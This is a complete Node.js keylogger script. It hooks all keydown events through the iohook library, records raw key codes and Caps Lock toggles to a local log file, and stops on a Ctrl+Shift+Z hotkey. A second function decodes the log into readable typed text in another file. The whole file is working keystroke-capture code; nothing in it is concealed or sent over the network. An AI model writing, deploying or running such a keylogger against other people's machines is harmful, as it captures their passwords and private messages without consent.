'use strict';
const fs = require('fs');
const ioHook = require('iohook');
var stream = fs.createWriteStream("log.log");
var capsLock = false;
ioHook.on('keydown', event => {
	if(event.shiftKey==true && event.ctrlKey==true && event.rawcode==90){
		ioHook.stop();
		processComplete()
	}
	if(event.rawcode==20){
		capsLock = !capsLock;
		stream.write("\nCAPS_"+capsLock+"\n");
	}
	else{
		if(event.rawcode==160){
			//do nothing it's a shift key
		}
		else if(event.shiftKey==true){
			stream.write("__"+event.rawcode+" ");
		}else{
			stream.write(event.rawcode+" ");
		}
	}
});

function processComplete(){
	var lineReader = require('readline').createInterface({
		input: fs.createReadStream('log.log')
	});
	var output = fs.createWriteStream('output.log');
	var caps = false;
	lineReader.on('line', function (line) {
		var currentLine = line.split(' ');
		if(currentLine[0]=='CAPS_true' || currentLine[0]=='CAPS_false'){
			caps = currentLine[0].split('_')[1] == 'true'?true:false;
		}else{
			for(let wordIndex in currentLine){
				let word = currentLine[wordIndex];
				if(word.startsWith("__")){
					output.write('__'+String.fromCharCode(word.split('__')[1]));
				}else{
					if(caps==false && word>=65 && word<=90){
						output.write(String.fromCharCode((parseInt(word)+32)));
					}else{
						output.write(String.fromCharCode(word));
					}
				}
			}
		}
	});
}

ioHook.start();

ioHook.start(true);

/*
{ 
  shiftKey: false,
  altKey: false,
  ctrlKey: false,
  metaKey: false,
  keycode: 30,
  rawcode: 65,
  type: 'keydown'
}
*/